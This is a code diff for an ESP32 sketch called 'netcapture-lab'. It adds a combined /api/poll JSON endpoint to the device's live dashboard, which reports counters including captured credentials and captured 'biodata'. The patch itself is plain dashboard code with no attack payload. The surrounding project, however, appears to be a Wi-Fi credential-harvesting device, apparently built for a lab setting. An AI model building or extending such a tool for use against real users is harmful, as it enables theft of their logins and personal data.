@@ -1,0 +1,50 @@
+// ============================================
+//  PATCH for esp32-netcapture-lab.ino
+//  Adds merged /api/poll endpoint (stats + events in one request)
+//  Keeps /api/events and /api/stats for backward compat + curl debugging
+// ============================================
+
+// --------------------------------------------
+//  STEP 1 — ADD this new handler function
+//  Paste it right AFTER handleApiStats() (around line 258)
+// --------------------------------------------
+
+void handleApiPoll() {
+  unsigned long since = 0;
+  if (server.hasArg("since")) {
+    since = strtoul(server.arg("since").c_str(), nullptr, 10);
+  }
+
+  // Build combined response: {"stats":{...},"events":[...]}
+  String json = "{\"stats\":{";
+  json += "\"uptime\":\"" + Logger::uptime() + "\"";
+  json += ",\"clients\":" + String(clientCount);
+  json += ",\"requests\":" + String(Logger::totalRequests);
+  json += ",\"get\":" + String(Logger::totalGET);
+  json += ",\"post\":" + String(Logger::totalPOST);
+  json += ",\"creds\":" + String(Logger::credsCaptured);
+  json += ",\"biodata\":" + String(Logger::biodataCaptured);
+  json += ",\"lastId\":" + String(EventBuffer::lastId());
+  json += "},\"events\":";
+  json += EventBuffer::toJSON(since);
+  json += "}";
+
+  server.sendHeader("Cache-Control", "no-store");
+  server.send(200, "application/json", json);
+}
+
+// --------------------------------------------
+//  STEP 2 — REGISTER the new route
+//  In setupRoutes(), under "Live Dashboard (Phase 4)",
+//  add this line (around line 350):
+// --------------------------------------------
+
+  server.on("/api/poll",   HTTP_GET, handleApiPoll);
+
+// So the block becomes:
+//
+//   // --- Live Dashboard (Phase 4) ---
+//   server.on("/dashboard", HTTP_GET, handleDashboard);
+//   server.on("/api/events", HTTP_GET, handleApiEvents);
+//   server.on("/api/stats",  HTTP_GET, handleApiStats);
+//   server.on("/api/poll",   HTTP_GET, handleApiPoll);   // ← new
